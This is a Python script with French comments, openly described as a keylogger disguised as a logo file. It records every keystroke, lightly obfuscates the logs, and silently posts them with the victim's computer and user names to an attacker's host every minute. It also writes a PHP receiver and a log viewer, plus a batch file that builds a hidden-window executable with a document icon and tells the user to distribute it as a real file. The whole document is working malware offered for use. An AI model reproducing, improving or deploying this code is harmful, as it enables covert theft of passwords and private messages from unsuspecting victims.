#!/usr/bin/env python3
# logo.exe - Faux logo, vrai keylogger qui upload sur ton host
# Compile avec: pyinstaller --onefile --noconsole --icon=logo.ico logo.py

import os
import sys
import time
import json
import base64
import hashlib
from datetime import datetime
from pynput.keyboard import Listener, Key
import threading
import requests  # pip install requests

# ========== CONFIG SIMPLE ==========
HOST_URL = "https://ton-site/image/"  # CHANGE ÇA !
SECRET_KEY = "mdp"  # CHANGE ÇA !
UPLOAD_INTERVAL = 60  # Secondes entre chaque upload

# ========== KEYLOGGER SIMPLE ==========
class SimpleKeyLogger:
    def __init__(self):
        self.buffer = ""
        self.filename = f"log_{int(time.time())}.txt"
        self.running = True
        
    def on_press(self, key):
        try:
            # Caractères normaux
            if hasattr(key, 'char') and key.char:
                self.buffer += key.char
            else:
                # Touches spéciales
                special = {
                    Key.space: " ", Key.enter: "\n", Key.tab: "\t",
                    Key.backspace: "[BACK]", Key.esc: "[ESC]",
                    Key.shift: "[SHIFT]", Key.ctrl_l: "[CTRL]", 
                    Key.cmd: "[WIN]", Key.alt_l: "[ALT]"
                }
                if key in special:
                    self.buffer += special[key]
                else:
                    self.buffer += f"[{str(key).replace('Key.', '')}]"
                    
        except:
            pass
        
        # STOP si mot secret
        if "logoFIN" in self.buffer:  # Mot pour arrêter
            self.upload_logs()
            self.running = False
            return False
    
    def obfuscate(self, text):
        """Encode simplement les logs"""
        # Base64 + reverse pour rendre illisible
        encoded = base64.b64encode(text.encode()).decode()
        return encoded[::-1]  # Reverse pour plus de sécurité
    
    def upload_logs(self):
        """Envoie les logs sur ton host"""
        if not self.buffer:
            return
        
        try:
            # Prépare les données
            data = {
                'key': SECRET_KEY,
                'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
                'user': os.environ.get('USERNAME', 'Unknown'),
                'logs': self.obfuscate(self.buffer),
                'filename': self.filename
            }
            
            # Envoie à ton host
            response = requests.post(
                f"{HOST_URL}upload.php",  # Voir fichier PHP ci-dessous
                data=data,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[UPLOAD OK] {len(self.buffer)} chars")
                self.buffer = ""  # Vide le buffer après upload
                return True
                
        except Exception as e:
            # Échec silencieux
            pass
        
        return False
    
    def auto_upload(self):
        """Upload automatique toutes les X secondes"""
        while self.running:
            time.sleep(UPLOAD_INTERVAL)
            if self.buffer:  # Si y'a du contenu
                self.upload_logs()
    
    def run(self):
        """Lance tout"""
        # Thread d'upload auto
        upload_thread = threading.Thread(target=self.auto_upload, daemon=True)
        upload_thread.start()
        
        # Keylogger
        with Listener(on_press=self.on_press) as listener:
            listener.join()

# ========== FICHIER PHP POUR TON HOST ==========
PHP_UPLOAD = """<?php
// upload.php - À mettre sur ton host
$secret_key = "mdp";  // MÊME QUE DANS LE SCRIPT

if ($_POST['key'] !== $secret_key) {
    die("Access denied");
}

// Crée le dossier logs s'il n'existe pas
if (!file_exists('logs')) {
    mkdir('logs', 0755, true);
}

// Prépare les données
$filename = 'logs/' . preg_replace('/[^a-z0-9._-]/i', '', $_POST['filename']);
$data = date('Y-m-d H:i:s') . " | " . $_POST['computer'] . " | " . $_POST['user'] . "\n";
$data .= strrev($_POST['logs']) . "\n";  // Dé-reverse
$data .= base64_decode($data) . "\n";    // Décode base64
$data .= "---\n";

// Écrit dans le fichier
file_put_contents($filename, $data, FILE_APPEND);

echo "OK";
?>
"""

# ========== FICHIER PHP POUR LIRE LES LOGS ==========
PHP_VIEWER = """<?php
// view.php - Pour voir les logs (protégé par mot de passe)
session_start();

// Mot de passe pour accéder aux logs
$admin_pass = "MonMot2Passe";

if ($_POST['password'] === $admin_pass) {
    $_SESSION['authenticated'] = true;
}

if (!isset($_SESSION['authenticated'])) {
    echo '<form method="POST">
        Password: <input type="password" name="password">
        <input type="submit" value="Login">
    </form>';
    exit;
}

// Affiche les logs
echo "<h2>Logs Récupérés</h2>";
$files = glob('logs/*.txt');
rsort($files);  // Plus récents d'abord

foreach ($files as $file) {
    echo "<h3>" . basename($file) . "</h3>";
    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    echo "<hr>";
}
?>
"""

# ========== SCRIPT POUR CRÉER LES FICHIERS ==========
def create_php_files():
    """Crée les fichiers PHP pour ton host"""
    with open('upload.php', 'w') as f:
        f.write(PHP_UPLOAD)
    
    with open('view.php', 'w') as f:
        f.write(PHP_VIEWER)
    
    print("✅ Fichiers PHP créés:")
    print("   - upload.php  (à mettre sur ton host)")
    print("   - view.php    (pour voir les logs)")
    print("\nSur ton host, crée un dossier 'logs/' en écriture")

# ========== COMPILATION ==========
def create_compile_bat():
    """Crée un .bat pour compiler"""
    bat_content = """@echo off
chcp 65001 >nul
echo Compilation de logo.exe
echo.

REM Installe les dépendances
pip install pynput requests pyinstaller

REM Compile avec icône (trouve une icône .ico de document)
pyinstaller --onefile --noconsole --name "logo" --icon=logo.ico logo.py

echo.
echo ✅ logo.exe créé dans dist/
echo.
echo 1. Mets upload.php sur ton host
echo 2. Change HOST_URL et SECRET_KEY dans le code
echo 3. Distribue logo.exe comme un vrai fichier
echo.
pause
"""
    
    with open('compile.bat', 'w') as f:
        f.write(bat_content)
    
    print("✅ compile.bat créé")

# ========== MAIN ==========
if __name__ == "__main__":
    # Si premier lancement, créer les fichiers
    if HOST_URL == "https://ton-site/image/":
        print("⚠️ CONFIGURATION REQUISE")
        print("1. Change HOST_URL et SECRET_KEY dans le code")
        print("2. Mets les fichiers PHP sur ton host")
        print("3. Compile avec compile.bat")
        
        create = input("\nCréer les fichiers PHP et compile.bat? (o/n): ")
        if create.lower() == 'o':
            create_php_files()
            create_compile_bat()
        
        input("\nConfigure puis relance. Appuie sur Entrée...")
        sys.exit(0)
    
    # Sinon, lancer le keylogger
    print("📁 logo.exe démarré (invisible)")
    print("   Logs uploadés sur:", HOST_URL)
    print("   Pour arrêter: tapez logoFIN")
    
    logger = SimpleKeyLogger()
    
    try:
        logger.run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        # Erreur silencieuse
        pass
